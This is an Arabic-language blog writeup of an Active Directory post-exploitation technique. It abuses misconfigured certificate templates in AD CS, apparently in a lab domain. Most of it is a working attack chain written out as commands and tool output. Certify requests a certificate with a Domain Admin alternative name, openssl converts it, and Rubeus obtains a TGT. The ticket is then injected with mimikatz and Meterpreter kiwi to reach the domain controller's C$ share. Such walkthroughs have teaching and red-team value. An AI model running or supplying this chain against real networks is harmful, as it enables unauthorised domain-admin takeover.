---
title: Misconfigured Certificate Templates
date: 2022-05-11 18:35:00 +0300
categories: [Writeup, PostExploit]
tags: [Active Directory]     # TAG names should always be lowercase
---






 



### Description:
&#x202b;
بسم الله الرحمن الرحيم والصلاة والسلام على اشرف المرسلين.
أActive Directory Certificate Services or AD CS هي تمبلت مقدمة من مايكروسوفت كنقطة بداية لتوزيع ال certificates وهي مصممه لتنفيذ احتياجات معينة، والاخطاء في اعداد هذه الشهادات قد يؤدي إلى privilege escalation وكذلك قد يساعدنا على التنقل بين الاجهزه على الدومين كنترولر عن طريق طلب ال TGT الخاص بأي دومين كنترولر عن طريق هذه الشهادة.

### Exploit
&#x202b;
عن طريق الاداة الجميله `Certify` نستطيع بكل بساطه البحث عن الفرنبل templates ، `Certify.exe find /vulnerable` 

![image](https://user-images.githubusercontent.com/54814433/172271163-5757fe3f-f49e-4449-b687-e3db36b8e9b5.png)
&#x202b;
بناءً على المخرجات من الاداة نستطيع معرفه:
&#x202b;
- اسم الـ vuln certificate
- اسم الـ DC المقدم لل vuln certificate
- الـ mspki certificate name flag
- الـ enrollment rights 
وبمساعدة هذه المعطيات نستطيع الان معرفة الدومين كنترولر المقدم للسيترفيكت، وكذلك عن اذا كان ال MSPKI CERT NAME FLAG هو `ENROLLEE_SUPPLIES_SUBJECT` فنستطيع تحديد الـ `subject alternative name` عند طلب ال VULN CERT وهذا يعني اننا نستطيع طلب ال cert لل domain admin !

&#x202b;
والان عن طريق الاداة `Certify` نستطيع طلب الvuln cert 

&#x202b;
`Certify.exe request /ca:dc-1.0xmaz.me\ca1 /template:VulnerableTemplate /altname:DomainAdmin`

&#x202b;
وهذا راح يعطينا ال `vulncert.pem` وبعد ذلك نقوم بتحويلها عن طريق

&#x202b;
`openssl pkcs12 -in vulncert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out vulncert.pfx`


&#x202b;
وبعد ذلك سنقوم بتحويل ال vulncert.pfx الى base64 


`cat cert.pfx | base64 -w 0`


&#x202b;
وبعد ذلك سنقوم بإستخدام الاداة `Rubeus` لطلب الـ tgt `asktgt` . 

```
Rubeus.exe asktgt /user:domainadmin /certificate:certbase64 /password:password /aes256 /nowrap

[*] Action: Ask TGT

[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=I, CN=Users, DC=0xmaz, DC=me 
[*] Building AS-REQ (w/ PKINIT preauth) for: '0xmaz.me\domainadmin'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      ....5pbw==

  ServiceName              :  krbtgt/0xmaz.me
  ServiceRealm             :  0XMAZ.ME
  UserName                 :  DomainAdmin
  UserRealm                :  0XMAZ.ME
  StartTime                :  1/18/2022 4:38:26 PM
  EndTime                  :  1/19/2022 2:38:26 AM
  RenewTill                :  1/25/2022 4:38:26 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  ....
  ASREP (key)              :  ....
```
&#x202b;
والان بعدما طلبنا التذكره نستطيع الدخول بها بكل بساطة، وهنالك طرق عديدة للدخول عن طريق الـ `kerberos ticket` بنتطرق بهذا الشرح لكم طريقة، ولكن قبل مانتطرق للشرح نحتاج نحول ال BASSE64 TICKET لـ `ticket.kirbi` ، وهذا بكل بساطة يتم عن طريق الامر التالي
```
$ on Linux
$ echo 'base64' | base64 --decode > ticket.kirbi
```
```
$ On Windows
$ [System.IO.File]::WriteAllBytes("C:/Users/User/Ticket.kirbi", [System.Convert]::FromBase64String("base64"))
```
&#x202b;
الان بعدما حولنا التكت، نبدأ بأول اداة
وهي mimikatz.exe
```
> mimikatz.exe
# privilege::debug
# kerberos::ptt C:/Users/User/Ticket.kirbi
...
File: 'C:/Users/User/Ticket.kirbi': OK
...
> klist | findstr "Cached"
...
Cached Tickets: (1)
...
# exit
Bye!
```
&#x202b;
الاداة الثانيه الا وهي Meterpreter عن طريق الاكستنشن `kiwi.rb` 
```
meterpreter > load kiwi
Loading extension kiwi...
.#####. mimikatz 2.2.0 20191125 (x64/windows)
.## ^ ##. "A La Vie, A L'Amour" - (oe.eo)
## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ## > http://blog.gentilkiwi.com/mimikatz
'## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )
'#####' > http://pingcastle.com / http://mysmartlogon.com ***/

Success.

meterpreter > kerberos_ticket_use ./Ticket.kirbi
[*] Using Kerberos ticket stored in ./Ticket.kirbi, 1856 bytes ...
[+] Kerberos ticket applied successfully.
meterpreter > kerberos_ticket_use ./Ticket.kirbi
[*] Using Kerberos ticket stored in ./Ticket.kirbi, 1856 bytes ...
[+] Kerberos ticket applied successfully.
meterpreter > shell
Process 6384 created.
Channel 7 created.
Microsoft Windows [Version 10.0.17763.1294]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\Temp>dir \0xmaz.me\c$
dir \\0xmaz.me\c$
Volume in drive \\0xmaz.me\c$ has no label.
Volume Serial Number is A4D0-6780

Directory of \\0xmaz.me\c$

10/09/2021 09:12 AM <DIR> logs
12/07/2019 07:14 PM <DIR> PerfLogs
10/08/2021 12:34 PM <DIR> Program Files
10/11/2021 10:32 AM <DIR> Program Files (x86)
10/08/2021 07:10 PM <DIR> Python27
02/02/2021 07:04 AM <DIR> shares
10/12/2021 09:38 AM <DIR> Users
10/11/2021 10:30 AM <DIR> Windows
0 File(s) 0 bytes
8 Dir(s) 27,732,598,784 bytes free
```

